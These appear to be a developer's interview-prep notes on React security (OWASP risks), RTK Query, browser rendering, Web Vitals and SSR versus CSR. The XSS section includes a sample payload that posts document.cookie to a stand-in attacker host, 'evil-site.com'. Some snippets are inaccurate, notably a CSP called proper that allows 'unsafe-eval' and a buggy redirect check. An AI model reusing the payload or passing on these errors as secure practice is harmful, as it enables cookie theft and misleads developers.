### what is OWASP attack, explain each, how we can prevent in react application

OWASP (Open Web Application Security Project) lists the most common web application security risks. Here are explanations of some key OWASP attacks and how to prevent them in a React application:

1.  `Injection Attacks`
    A. Description: Injection attacks occur when an attacker injects malicious data into a web application, often through user input, to execute unauthorized commands.

    B. Injection attacks occur when untrusted or malicious data is sent to an application and is processed as code rather than data. In React applications, this can happen through various entry points like user inputs, URL parameters, or API responses.

**Common Types of Injection Attacks in React:**

1. Cross-Site Scripting (XSS)
2. SQL Injection
3. HTML Injection
4. JavaScript Injection

How Injection Attacks Can Happen:

1. Unsafe innerHTML Usage:

```js
// Vulnerable code : This code blindly trusts and renders whatever HTML content is passed in the userData prop using dangerouslySetInnerHTML without any sanitization.

function DisplayUser({ userData }) {
  return <div dangerouslySetInnerHTML={{ __html: userData }} />;
}

// Attacker could pass malicious userData like:
const maliciousData = `
  <img src="x" onerror="
    alert('Hacked!');
    fetch('https://evil-site.com/steal', {
      method: 'POST',
      body: JSON.stringify(document.cookie)
    });
  ">
`;

<DisplayUser userData={maliciousData} />;

// Use JSX Escaping:
// Safe approach - React automatically escapes values
function SafeComponent({ userInput }) {
  return <div>{userInput}</div>;
}
```

2. URL Parameter Injection:

```js
// Vulnerable code
function SearchComponent() {
  const query = new URLSearchParams(window.location.search).get("q");
  return <div dangerouslySetInnerHTML={{ __html: query }} />;
}

//  Fixed Code:

import DOMPurify from "dompurify";

function SearchComponent() {
  const query = new URLSearchParams(window.location.search).get("q");
  const sanitizedContent = DOMPurify.sanitize(query);

  return <div dangerouslySetInnerHTML={{ __html: sanitizedContent }} />;
}
```

`Prevention in React:`

a. Use parameterized queries: Ensure that any database interactions use parameterized queries to prevent direct SQL injection.

b. Validate user input: Always validate and sanitize user input to prevent malicious data from being injected into your application.

c. Use libraries like DOMPurify: For client-side rendering, use libraries like DOMPurify to sanitize any user-generated content before rendering it.

2. `Broken Authentication`
   Description: Weak authentication mechanisms allow attackers to access sensitive data or systems.

`Prevention in React:`

a. Use secure authentication libraries: Implement robust authentication using libraries like Auth0 or Okta.

b. Implement session management: Properly manage user sessions to prevent unauthorized access.

c. Use HTTPS: Ensure all authentication traffic is encrypted using HTTPS.

**Example:**

```js
// Implement proper session management
const AuthProvider = ({ children }) => {
  const [token, setToken] = useState(null);

  const login = useCallback(async (credentials) => {
    // Use HTTPS for API calls
    const response = await fetch("/api/login", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      credentials: "include", // For handling cookies securely
      body: JSON.stringify(credentials),
    });
    // Handle token storage securely
  }, []);

  return <AuthContext.Provider value={{ token, login }}>{children}</AuthContext.Provider>;
};
```

3. `Sensitive Data Exposure`
   Description: Sensitive data, such as passwords or credit card numbers, is not properly protected.

`Prevention in React:`

a. Encrypt sensitive data: Always encrypt sensitive data both in transit (using HTTPS) and at rest (using encryption algorithms).

b. Use secure storage: Store sensitive data securely, such as using environment variables or secure vaults.

c. Limit data exposure: Only expose sensitive data when necessary and ensure it is properly sanitized.

**Example :**

```js
// Environment variables
// .env file
REACT_APP_API_KEY = your_api_key;

// Usage
const apiKey = process.env.REACT_APP_API_KEY;

// Implement proper data masking
const SensitiveData = ({ data }) => {
  const maskData = (value) => {
    return value.replace(/\d(?=\d{4})/g, "*");
  };

  return <div>{maskData(data)}</div>;
};
```

4. `XML External Entities (XXE)`
   Description: XXE attacks exploit vulnerabilities in XML parsing to access unauthorized data or execute system calls.

   XXE attacks happen when an application processes XML data without properly disabling dangerous features, particularly when parsing XML files from external sources.

`Prevention in React:`

a. Avoid parsing XML: If possible, avoid parsing XML in your application. Use JSON instead.

b. Use secure XML parsing libraries: If XML parsing is necessary, use libraries that prevent XXE attacks, such as those with disabled external entity expansion.

c. File Upload Protection: Secure file upload handling, Validate file type, Read file safely.

d. Input Validation : Check for suspicious patterns

5. `Broken Access Control`
   Description: Insufficient access controls allow unauthorized users to access sensitive data or perform actions they shouldn't.

`Prevention in React:`

a. Implement role-based access control (RBAC): Ensure that users can only access data and perform actions based on their roles.

b. Validate user permissions: On every request, validate that the user has the necessary permissions to access the requested resource.

c. Use secure routing: Use client-side routing with server-side validation to ensure that unauthorized routes cannot be accessed.

d. Protected Component Structure: use Higher-order component for permission checking

6. `Security Misconfiguration`
   Description: Poorly configured security settings expose vulnerabilities.

`Prevention in React:`

a. Keep dependencies updated: Regularly update dependencies to ensure you have the latest security patches.

b. Use a Web Application Firewall (WAF): Consider using a WAF to protect against common web attacks.

c. Configure security headers: Properly configure security headers like Content-Security-Policy (CSP) and Cross-Origin Resource Sharing (CORS).

**Example :**

```js
// Configure proper CORS in your backend
// Implement Content Security Policy (CSP)

// In your server configuration
{
  "headers": {
    "Content-Security-Policy": "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline';"
  }
}

```

7. `Cross-Site Scripting (XSS)`
   Description: XSS attacks inject malicious scripts into web pages viewed by other users.

`Prevention in React:`

1. Use JSX: React's JSX helps prevent XSS by automatically escaping user input.

2. Validate user input: Always validate and sanitize user input before rendering it.

3. Use DOMPurify: For any dynamic content that isn't handled by JSX, use DOMPurify to sanitize it.

**Example:**

```js
// Bad practice
const UserInput = ({ data }) => {
  return <div dangerouslySetInnerHTML={{ __html: data }} />;
};

// Good practice
const UserInput = ({ data }) => {
  return <div>{data}</div>; // React automatically escapes content
};

// For URLs
const SafeRedirect = ({ url }) => {
  const safeUrl = useMemo(() => {
    const url = new URL(url);
    return ["https:", "http:"].includes(url.protocol) ? url : null;
  }, [url]);

  return safeUrl ? <a href={safeUrl}>Link</a> : null;
};
```

4. `Insecure Deserialization`
   A. Description: Deserializing data from untrusted sources can lead to code execution vulnerabilities.

   B. Insecure Deserialization is a security vulnerability that occurs when untrusted data is used to abuse the deserialization process. When an application deserializes malicious data, it can lead to:

   a. Remote code execution
   b. Denial of Service (DoS) attacks
   c. Data tampering
   d. Privilege escalation

`How it can happen in React applications:`

1. Local Storage/Session Storage:

```js
// Vulnerable code
const userData = localStorage.getItem("user");
const user = JSON.parse(userData); // Unsafe deserialization
```

2. API Responses:

```js
// Vulnerable code
fetch("/api/data")
  .then((response) => response.json()) // Unsafe deserialization of API response
  .then((data) => setState(data));
```

3. URL Parameters:

```js
// Vulnerable code
const params = new URLSearchParams(window.location.search);
const data = JSON.parse(params.get("data")); // Unsafe deserialization
```

`Prevention in React:`

a. Avoid deserializing untrusted data: Only deserialize data from trusted sources.

b. Use secure deserialization libraries: If deserialization is necessary, use libraries that safely handle it.

c. Implement proper error handling.

d. Keep dependencies updated

e. Use HTTPS for API communications

f. Implement Content Security Policy (CSP)

9. `Using Components with Known Vulnerabilities`
   Description: Using components with known vulnerabilities exposes your application to attacks.

`Prevention in React:`

a. Keep dependencies updated: Regularly update your dependencies to ensure you have the latest security patches.

b. Use tools like npm audit: Tools like npm audit can help identify vulnerable dependencies

c. Secure Package Installation: Use exact versions instead of ranges, Avoid using ^ or ~ which can lead to auto-updating to vulnerable versions.

d. Automated Security Checks: CI/CD Pipeline Configuration

```js
// CI/CD Pipeline Configuration
module.exports = {
  scripts: {
    "pre-commit": "npm run security-check",
    "security-check": ["npm audit", "snyk test", "npm outdated"].join(" && "),
    "version-check": "node scripts/check-versions.js",
  },
};
```

10. `Insufficient Logging & Monitoring`
    a. Keep logs secure
    b. Monitor critical operations
    c. Set up alerts
    d. Regular log analysis
    e. Maintain audit trails
    f. Follow privacy regulations
    g. Implement proper retention policies

### What is RTK Query, how does it work, and how does it differ from our standard implementation?

RTK Query is a tool built into Redux Toolkit designed to simplify data fetching and caching in web applications. It eliminates the need for manually writing logic for API calls, caching, and managing request states like loading or errors.

OR

RTK Query is a powerful data fetching and caching tool included in Redux Toolkit that automates common data fetching patterns.

`Differences from Standard Redux Implementations : `

1. RTK Query offers several advantages over traditional Redux implementations using createSlice and createAsyncThunk:

2. Simplified API Calls: Traditional Redux requires setting up thunks, dispatching actions, and writing reducers to manage API states. RTK Query abstracts this into a single API slice.

3. Automatic State Management: Loading, error, and success states are automatically handled by RTK Query hooks, reducing boilerplate code.

4. Integrated Caching: Unlike standard Redux where caching logic must be implemented manually, RTK Query provides built-in caching and invalidation mechanisms.

5. Centralized Configuration: All API endpoints are defined in one place (API slice), improving maintainability compared to scattered custom hooks or thunks.

6. Document Cache vs Normalized Cache: RTK Query uses a document cache approach, storing query results independently without deduplication across queries. This is simpler but less sophisticated than normalized caches used in tools like Apollo Client.

7. Automatic Re-fetching:
   a. Can configure automatic polling

b. Refetches when window regains focus

c. Refetches when network is restored

8. Code Reduction:
   a. Eliminates boilerplate code
   b. No need for separate actions/reducers
   c. Generates hooks automatically

9. Performance Optimization:
   a. Deduplication of requests
   b. Normalized cache storage
   c. Efficient updates
   d. Request cancellation

`NOTE :` RTK Query significantly reduces boilerplate code while providing advanced features for data fetching and caching, making it a preferred choice for many Redux-based applications.

### React Questions

# 1. Question

what is JSX , and how does react convert jsx into html ?

JSX (JavaScript XML) is a syntax extension for JavaScript that allows you to write HTML-like code within your JavaScript code. It makes React code more readable and writing templates more intuitive.

Here's how JSX works and gets converted to HTML:

1. JSX Syntax:

```js
// JSX Example
const element = (
  <div className="greeting">
    <h1>Hello, World!</h1>
    <p>Welcome to React</p>
  </div>
);
```

2. Behind the scenes, Babel (a JavaScript compiler) transforms this JSX into regular JavaScript using React.createElement() calls:

```js
// Transformed JavaScript
const element = React.createElement("div", { className: "greeting" }, React.createElement("h1", null, "Hello, World!"), React.createElement("p", null, "Welcome to React"));
```

3. The React.createElement() function creates objects (Virtual DOM elements) that look like this:

```js
// Simplified representation of the object created
{
  type: 'div',
  props: {
    className: 'greeting',
    children: [
      {
        type: 'h1',
        props: {
          children: 'Hello, World!'
        }
      },
      {
        type: 'p',
        props: {
          children: 'Welcome to React'
        }
      }
    ]
  }
}


```

`The conversion process happens in this order:`

1. You write JSX code

2. Babel transforms JSX into React.createElement() calls during the build process

3. React.createElement() creates Virtual DOM elements

4. React uses these Virtual DOM elements to efficiently update the actual DOM

NOTE : JSX is not required for using React, but it makes the code more readable and writing templates more intuitive, which is why it's commonly used in React applications.

Example :

```js
1. Simple Component with JSX:

// With JSX
function Welcome() {
  return <h1>Hello, World!</h1>;
}

2. Same Component without JSX:
// Without JSX
function Welcome() {
  return React.createElement('h1', null, 'Hello, World!');
}


```

# 2. Question

What occurs when a change in state triggers a color/ state change? How does HTML parse these changes and display the updates? What are the underlying steps involved in this process?

`The Complete Process Step by Step:`

1. Initial Trigger : When state changes
2. Component Re-render : React schedules a re-render
3. Virtual DOM Creation : New Virtual DOM tree is created

4. Diffing Process : React compares old and new Virtual DOM

5. Batch Processing : Multiple state updates are batched. ( React will batch these into a single re-render )

6. Final DOM Update : Only necessary DOM updates are made

# Question 3.

What are reflow and painting in React/HTML, and when do they occur?

1. `Reflow (Layout):`
   A reflow occurs when changes affect the layout of elements (position, size, etc.).

Common Reflow Triggers:

```js
// 1. DOM Element Changes

// These operations trigger reflow
element.style.width = "200px"; // Size changes
element.style.position = "absolute"; // Position changes
element.style.margin = "20px"; // Margin/padding changes
element.style.display = "block"; // Display changes

// 2. Window Operations
window.resize(); // Window resize
window.scroll(); // Scrolling

// 3. DOM Manipulation
parentElement.appendChild(newElement); // Adding elements
element.removeChild(childElement); // Removing elements

// 4. Position Changes
element.style.position = "absolute";
element.style.top = "50px";
element.style.left = "100px";
element.style.float = "left";

// 5. Text/Content Changes
element.style.fontSize = "16px";
element.style.lineHeight = "1.5";
element.textContent = "New text";
```

2. Painting occurs when visual styles change without affecting layout.

`Common Paint Triggers:`

```js
// These operations only trigger repaint
element.style.color = "red"; // Color changes
element.style.backgroundColor = "blue"; // Background changes
element.style.visibility = "hidden"; // Visibility changes
```

# Question 4.

What are First Contentful Paint (FCP), Largest Contentful Paint (LCP), Total Blocking Time (TBT), and Cumulative Layout Shift (CLS)? How do these metrics impact website performance, and what strategies can be implemented to enhance them?"

1. `First Contentful Paint (FCP):`

a. Measures the time from when the page starts loading to when any content (text, image, canvas, etc.) is first displayed

b. Target: Under 1.8 seconds for good user experience

`Definition:` FCP measures the time it takes for the first piece of content (text, image, etc.) to be rendered on the screen after a user navigates to a page.

`Impact:` A fast FCP indicates that users can start engaging with the content quickly, which enhances their perception of the site's speed.

Optimization strategies:

```js
// 1. Eliminate render-blocking resources
// Add async/defer to non-critical scripts
<script async src="non-critical.js"></script>
<script defer src="deferred.js"></script>

// 2. Preload critical resources
<link rel="preload" href="critical-style.css" as="style">
<link rel="preload" href="important-font.woff2" as="font" crossorigin>

// 3. Implement critical CSS inline
<style>
  /* Critical styles needed for above-the-fold content */
  .header { ... }
  .hero { ... }
</style>


Improvement Strategies:

  Optimize server response times.
  Minimize render-blocking resources (e.g., CSS and JavaScript).
  Use efficient caching strategies.
  Implement a Content Delivery Network (CDN) to reduce latency.

```

2. `Largest Contentful Paint (LCP):`

a. Measures loading performance by timing when the largest content element becomes visible

b. Target: Under 2.5 seconds

`Definition:` LCP measures the time it takes for the largest visible content element (such as an image or video or Text blocks or SVG elements ) to load and become visible in the viewport.

`Impact:` A good LCP score is crucial for user satisfaction, as it reflects how quickly the main content of the page is loaded.

Optimization strategies:

```js
// 1. Optimize images
// Use modern formats and responsive images
<picture>
  <source srcset="image.webp" type="image/webp">
  <source srcset="image.jpg" type="image/jpeg">
  <img src="image.jpg" alt="..." loading="lazy">
</picture>

// 2. Implement caching
// Example using service worker
self.addEventListener('fetch', event => {
  event.respondWith(
    caches.match(event.request)
      .then(response => response || fetch(event.request))
  );
});

// 3. Prioritize LCP element
const observer = new PerformanceObserver((list) => {
  const entries = list.getEntries();
  const lcpElement = entries[entries.length - 1];
  // Add priority hints or preload if needed
});
observer.observe({ entryTypes: ['largest-contentful-paint'] });


Improvement Strategies:
  Optimize images and videos (e.g., use next-gen formats like WebP).
  Ensure that critical resources are loaded quickly.
  Improve server response times and leverage lazy loading for offscreen images.
```

3. `Total Blocking Time (TBT):`

a. Measures the total time between FCP and Time to Interactive where the main thread was blocked

b. Target: Under 200 milliseconds

`Definition:` TBT measures the total time between FCP and Time to Interactive (TTI) when the main thread is blocked and unable to respond to user input.

`Impact:` High TBT can lead to a frustrating user experience, as it indicates that the page is not fully interactive.

Optimization strategies:

```js
// 1. Break up long tasks
// Instead of one long task
function longTask() {
  // Heavy computation
}

// Break into smaller chunks
function breakUpTask(data) {
  const chunks = splitIntoChunks(data);

  function processChunk() {
    const chunk = chunks.shift();
    if (chunk) {
      // Process chunk
      requestIdleCallback(processChunk);
    }
  }

  requestIdleCallback(processChunk);
}

// 2. Use Web Workers for heavy computation
const worker = new Worker("compute.js");
worker.postMessage(data);
worker.onmessage = (event) => {
  // Handle result
};

Improvement Strategies:
  Minimize JavaScript execution time and optimize scripts.
  Split long tasks into smaller, asynchronous tasks.
  Use web workers to handle heavy computations off the main thread.
```

4. `Cumulative Layout Shift (CLS):`

a. Measures visual stability by quantifying unexpected layout shifts

b. Target: Under 0.1

`Definition:` CLS quantifies the visual stability of a page by measuring how much the content shifts during loading.

`Impact:` A high CLS score can lead to a poor user experience, as unexpected shifts can cause users to click on the wrong elements.

Optimization strategies:

```js
// 1. Reserve space for dynamic content
.ad-container {
  min-height: 250px;
  width: 100%;
}

// 2. Set dimensions for media elements
<img
  src="image.jpg"
  width="800"
  height="600"
  alt="..."
/>

// 3. Use CSS transform for animations instead of properties that trigger layout
// Bad
.element {
  animation: move 1s {
    from { top: 0; }
    to { top: 100px; }
  }
}

// Good
.element {
  animation: move 1s {
    from { transform: translateY(0); }
    to { transform: translateY(100px); }
  }
}

Improvement Strategies :
  Always specify size attributes for images and videos.
  Avoid inserting content above existing content (e.g., ads) without reserving space.
  Use CSS to create a stable layout and avoid layout thrashing.

```

# Question 5.

explain the key phases in HTML rendering:

1. `Parsing Phase`

a. The browser's HTML parser reads the HTML code
b. Creates a Document Object Model (DOM) tree
c. Each HTML element becomes a node in this tree
d. This is the initial structural representation

2. `Rendering Phase`

a. Once the DOM is constructed, the browser begins rendering
b. Determines layout of elements
c. Calculates styles and positioning
d. Creates the Render Tree
e. Combines DOM with CSSOM (CSS Object Model)

3. `Painting Phase`

a. Final step where visual elements are drawn
b. Converts the Render Tree into actual pixels on screen
c. Handles colors, images, borders, shadows, etc.

**Here's a practical example showing these phases:**

```js
// 1. Initial HTML
<div class="container">
  <h1>Hello World</h1>
  <p>This is a paragraph</p>
</div>;

// 2. DOM Tree Creation (Parsing Phase)
document.createElement("div");
document.createElement("h1");
document.createElement("p");

// 3. Style Processing (Rendering Phase)
const styles = {
  container: {
    width: "100%",
    maxWidth: "800px",
    margin: "0 auto",
  },
};

// 4. Layout Calculation (Rendering Phase)
element.getBoundingClientRect();
// Returns: { top: 0, right: 800, bottom: 200, left: 0, width: 800, height: 200 }

// 5. Paint Operations (Painting Phase)
// Browser converts the above into pixels
```

# Question 6.

Explain the difference between async and defer attributes in script loading:

Key Differences:

1. `Loading Behavior :`

A. async: Downloads the script asynchronously while HTML parsing continues, executes immediately once downloaded

B. defer: Downloads the script asynchronously while HTML parsing continues, but waits to execute until HTML is fully parsed

2. `Execution Order :`

A. async: Scripts execute in no particular order (first downloaded, first executed)

B. defer: Scripts execute in order they appear in the document

3. `DOM Ready :`

A. async: Doesn't wait for DOM to be ready

B. defer: Waits for DOM to be fully ready before execution

**Use Cases:**

`Use async when :`

1. The script is completely independent
2. No dependencies on other scripts
3. Doesn't manipulate DOM on load
4. Examples: Analytics, tracking scripts

```js
<script async src="analytics.js"></script>
<script async src="tracking.js"></script>

```

**Use defer when :**

1. Script depends on DOM being ready
2. Script has dependencies on other scripts
3. Order of execution matters

```js
<script defer src="framework.js"></script>
<script defer src="app.js"></script>
<script defer src="components.js"></script>

```

**Use regular script when :**

1. Script needs to block parsing
2. You need immediate execution

```js
<script src="critical.js"></script>
```

# Question 7.

Explain Execution Context and Global Execution Context (GEC)

`Execution Context` is the environment where JavaScript code is executed. It contains information about the variables, functions, and the scope chain that the code has access to.

`Types of Execution Context:`

1. Global Execution Context (GEC)
2. Function Execution Context (FEC)
3. Eval Execution Context

**Global Execution Context (GEC) :**
GEC is the default context created when JavaScript code starts running. It represents the global scope. Only one GEC exists per JavaScript program

# Question 8. How a web page is rendered in browser? OR Critical Rendering Path

`The Critical Rendering Path (CRP) is the sequence of steps the browser takes to convert HTML, CSS, and JavaScript into pixels on the screen. Understanding and optimizing the CRP is crucial for improving website performance and user experience.`

In each HTTP request that browser makes for an HTML page, the server returns the data into bytes, these bytes are then converted to Characters, Tokens, Nodes, and finally DOM (Document Object Model).

Once the DOM is generated, the parsing of the page starts, the HTML contains CSS code or links, JavaScript code or links, media elements such as images, etc, each of them is then parsed separately and plugged together to create a render tree, which is then converted to the layout and then is painted on the screen at the refresh rate of 60 frames per second.

This complete process is called a critical rendering path.

`The complete page rendering can be broken down into 5 different steps :`

1. `HTML Parsing & DOM Construction :` Browser receives HTML content then Converts HTML into DOM nodes.

2.` Creation of CSSOM. ( CSSOM stores all the styling information ) :` It blocks the rendering of the webpage until all the CSS style is loaded, parsed, and applied to each DOM node. It is blocking in nature because CSS styles can be overridden.

3. `Formation of Render tree (Combines DOM and CSSOM):` Once the DOM and the CSSOM are ready, the browser engine combines them together to create the render tree. Only includes visible elements (excludes <head>, display: none, etc.)

4. `Layouting ( Reflow ) :` Once the render tree is ready the layout can be created, the layout is bounded on the device dimension. Calculate exact position and size of each element.

5. `Paint :` Once the layout is ready, it can be painted pixel by pixel on the screen at the refresh rate of 60fps. Includes text, colors, images, borders, shadows, etc.

6. Composing all layers together, to render the website on screen.

NOTE :
DOM parsing : DOM parsing is the process where the browser converts HTML code into a tree-like structure called the Document Object Model (DOM).

<!--             Micro Front - End             -->

<!-- There are different approaches for architecturing a micro-frontends application. Certain architectural decisions have to be made upfront because they will cave the road for future decisions. The decision majorly covers four key areas.

1. Defining different micro-frontends.
2. Composing micro-frontends.
3. Routing micro-frontends.
4. Communicating between micro-frontends. -->

### Server-Side Rendering (SSR) and Client-Side Rendering (CSR) :

1. **Multi page application (Server Side rendered or SSR)**

The term Multi-page refers that every time you navigate on the web application, a new HTML page is generated on the server and is returned to the browser, where the browser parses the HTML and displays the content.

These are the traditional rendering patterns that have been followed since the inception of web applications.

When a request to the server is made, the server generates the HTML page with all the content pre-filled and it returns it to the browser, where the browser applies all the styles or CSS, loads the assets, and shows the page.

While introduction of Ajax has reduced the number of round-trips to the server as the data can be fetched asynchronously and the UI can be updated on the run-time. But it can be only used for minor operations.

`Advantages of Multi-page application (SSR)`

1. Better SEO, As the HTML is generated on the server side, all the meta tags, title, description, and other things that affect SEO are generated beforehand making it easier for the search engine crawlers to crawl the page which results in a better ranking.

2. Scalable, As the pages are generated on the server, you can create as many extended pages as possible without really making any code changes.

3. More Secure, Better for security as the forms that handle user’s data can be prevented from the Cross-site scripting attacks.

4. Faster Initial load, As the HTML page is generated on the server with the data already populated, it is faster to load it.

`Disadvantages of Multi-page application (SSR)`

1. Slow, as every time the user navigates, the request goes back to the server and it returns the new HTML (that also increases the response payload size) which has to be parsed, rendered, and shown in the browser.

2. Tightly coupled, The frontend and backend code are strongly coupled, as while the HTML is being generated it is populated with the data.

`Applications of Multi-page application (SSR)`

1. Best suited for applications that require search engine optimization.

2. **Single page application (Client Side rendered or CSR)**

Single page application as the term suggests, is composed of a single HTML file that is loaded only once along with all the static files such as CSS, JavaScript, and media assets and renders the application on the client side after loading the assets in the browser.

It uses client-side navigation (JavaScript based on the browser) that on page change, requests for only data from the server and updates the UI on run time.

In the multi-page application, every time the server returns a fresh HTML page, that has to be parsed, constructed, and then rendered again. Even though modern browsers are more capable, it is still a performance-inefficient process to render HTML, especially in the mobile browser.

The modern JavaScript frameworks are trying to solve this by minimizing the DOM manipulation and HTML rendering with the implementation of Virtual DOM and other better reconciliation algorithms to update only what changes.

You can use React, Angular, Vue, etc to create single-page applications. It effectively uses the concept of Asynchronous programming (Ajax) where it requests the data from the server when required, reducing the server response time as it does not have to generate and return the whole HTML and renders the DOM with this new data the runtime.

`Advantages of Single page application (CSR)`

1. Blazing fast, as the static files are loaded only once on the initial render, and after that only required data is pulled from the server and UI is updated on runtime. Also the the JavaScript code that is not required on initial load can be split in different bundles and lazy loaded, reducing the JavaScript execution time in browser.

2. Decoupled, the frontend and backend can be developed independently resulting in faster development.

3. Extendable, the same frontend application can be used to create mobile or desktop apps without any major code changes, all thanks to these modern JavaScript frameworks.

`Disadvantages of Single page application (CSR)`

1. Poor SEO, As there is a single HTML page, it becomes difficult to handle the SEO and update the search engine crawlers.

2. Navigation, at times when an application becomes bigger, it becomes difficult to handle the browser history and navigation.

3. Security, there is an increased threat for cross-site scripting attacks for single page applications.

4. Slower Initial load, As all the static files are loaded at once on the initial call, it becomes little slower if the JavaScript bundle size is bigger as only after its loading and parsing, the HTML page will be constructed.

5. Memory usage, As the page building heavily relies on the JavaScript, large builds consume lots of memory and there is also chance of memory leakage if it is not handled properly.

`Applications of Single page application (CSR)`

1. It is best suited for web applications that do not require SEO like Analytics dashboard, Admin dashboards, Personal portfolios, Real time data showcase, etc.

**Conclusion: SPA (CSR) vs MPA (SSR)**
While both of them have their use cases, they are suited for the different requirements.

1. Single-page applications (CSR) can be most suited where we you want to show real-time data without worrying about the SEO issues and provide better user interactions.

2. Multi-page applications (SSR) can be used where the SEO is the major factor such as E-commerce, Blogs, SaaS, etc.

3. For the multi-page applications, you can use the hybrid approach with modern JavaScript frameworks such as Nextjs to take advantage of both of these.

### Differences between Server-Side Rendering (SSR) and Client-Side Rendering (CSR)

1. `Rendering Location and Process:`

_SSR:_

1. HTML is generated on the server
2. Complete HTML is sent to browser
3. Browser displays content immediately
4. Subsequent interactions may require new server requests

_CSR:_

1. Server sends minimal HTML and JavaScript bundle
2. Browser runs JavaScript to generate content
3. Initial page is empty until JS executes
4. Content renders in the browser

5. `Performance Characteristics:`

**SSR:**

1. Faster initial page load
2. Better First Contentful Paint (FCP)
3. Higher server resource usage
4. Slower subsequent page transitions

**CSR:**

1. Slower initial load
2. Faster subsequent navigation
3. Lower server load
4. Smoother user experience after initial load

5. `SEO Considerations:`

**SSR:**

1. Better for SEO as content is ready for crawlers
2. Search engines see full content immediately
3. Metadata is pre-rendered

**CSR:**

1. Can be challenging for SEO
2. Requires additional setup for crawler support
3. Some content might not be indexed properly

4. `Use Cases:`

_SSR is better for:_

1. Content-focused websites
2. SEO-critical applications
3. Sites requiring fast initial load
4. Low-interaction pages

_CSR is better for:_

1. Highly interactive applications
2. Dynamic content updates
3. Single Page Applications (SPAs)
4. Web applications with frequent user interactions

5. `Resource Usage:`

_SSR:_

1. Higher server CPU/memory usage
2. Lower client-side resource usage
3. More bandwidth efficient for static content

**CSR:**

1. Lower server resource usage
2. Higher client-side resource usage
3. More bandwidth efficient for dynamic content

4. `Maintenance and Scaling:`

_SSR:_

1. Requires server maintenance
2. Scaling involves server infrastructure
3. Server-side caching strategies needed

_CSR:_

1. Easier to scale (mostly static files)
2. CDN-friendly
3. Less server maintenance required

# What is concurrent rendering and Why React 18 added concurrent rendering .

Concurrent rendering in React is a set of features that allows React to interrupt, pause, and resume rendering work to keep the application responsive. It's a fundamental shift from the traditional synchronous rendering model.

> Traditional Rendering (Blocking)

React renders the entire component tree synchronously
Once rendering starts, it can't be interrupted
Can cause UI freezing for complex updates

> Concurrent Rendering (Non-blocking)

React can pause rendering work and yield control back to the browser
Allows high-priority updates to interrupt low-priority ones
Keeps the UI responsive during heavy computations.

> Why React 18 added concurrent rendering ?

`Use Before react 18 :`

1. React 17 and earlier used synchronous rendering
2. Once rendering started, it couldn't be interrupted
3. Long renders would freeze the entire UI
4. User interactions became unresponsive during heavy computations

`Solution in React 18 :`

1. Keep the UI interactive even during heavy rendering work.
2. More efficient CPU usage.
3. Prevents JavaScript from hogging the main thread.
4. Automatic batching

# How to profile a React app and fix bottlenecks.

1. Profiling Tools.

> React DevTools Profiler

```ts
// Wrap components to profile
import { Profiler } from "react";

function App() {
  return (
    <Profiler id="App" onRender={onRenderCallback}>
      <MyComponent />
    </Profiler>
  );
}

function onRenderCallback(id, phase, actualDuration) {
  console.log("Component:", id, "Duration:", actualDuration);
}

//                  Open Browser DevTools :
// Performance Tab: Record and analyze runtime performance
// Memory Tab: Check for memory leaks
// Network Tab: Analyze bundle sizes and loading times
```

2. Common Bottlenecks & Fixes

A. Unnecessary Re-renders

```ts
// Problem: Component re-renders on every parent update
function ExpensiveChild({ data }) {
  return <div>{heavyComputation(data)}</div>;
}

// Fix: Memoize component
const ExpensiveChild = React.memo(({ data }) => {
  return <div>{heavyComputation(data)}</div>;
});
```

B. Expensive Computations

```ts
// Problem: Computation runs on every render
function Component({ items, filter }) {
  const filteredItems = items.filter((item) => item.includes(filter));
  return (
    <div>
      {filteredItems.map((item) => (
        <div key={item}>{item}</div>
      ))}
    </div>
  );
}

// Fix: Use useMemo
function Component({ items, filter }) {
  const filteredItems = useMemo(() => items.filter((item) => item.includes(filter)), [items, filter]);
  return (
    <div>
      {filteredItems.map((item) => (
        <div key={item}>{item}</div>
      ))}
    </div>
  );
}
```

C. Large Lists

```ts
// Problem: Rendering thousands of items
function LargeList({ items }) {
  return (
    <div>
      {items.map((item) => (
        <Item key={item.id} data={item} />
      ))}
    </div>
  );
}

// Fix: Use virtualization
import { FixedSizeList as List } from "react-window";

function LargeList({ items }) {
  return (
    <List height={600} itemCount={items.length} itemSize={50}>
      {({ index, style }) => (
        <div style={style}>
          <Item data={items[index]} />
        </div>
      )}
    </List>
  );
}
```

D. Bundle Size Issues.

```ts
// Problem: Large bundle size
import { debounce } from "lodash";

// Fix: Import only what you need
import debounce from "lodash/debounce";

// Or use dynamic imports
const LazyComponent = React.lazy(() => import("./LazyComponent"));
```

3. Performance Monitoring

A. Web Vitals

```ts
import { getCLS, getFID, getFCP, getLCP, getTTFB } from "web-vitals";

getCLS(console.log);
getFID(console.log);
getFCP(console.log);
getLCP(console.log);
getTTFB(console.log);
```
> NOTE : The key is to profile first, then optimize based on actual bottlenecks rather than premature optimization.

# How does React's Fiber architecture actually work and why does it matter for performance?

> WWhat is React Fiber?
React Fiber is React's reconciliation engine - the algorithm that decides what changes need to be made to the DOM. Think of it as React's "brain" that figures out how to update your UI efficiently.

> Why Fiber Matters for Performance

 1. Responsiveness :
User interactions stay responsive and Your app never freezes, Even during heavy updates

2. Better User Experience

3. Efficient Updates
Fiber can batch and prioritize updates

4. Better Performance
Browser can handle other tasks while React works

5: Smart Priorities
Important things (like user input) happen first and  LOW PRIORITY Update notifications later : using startTransition()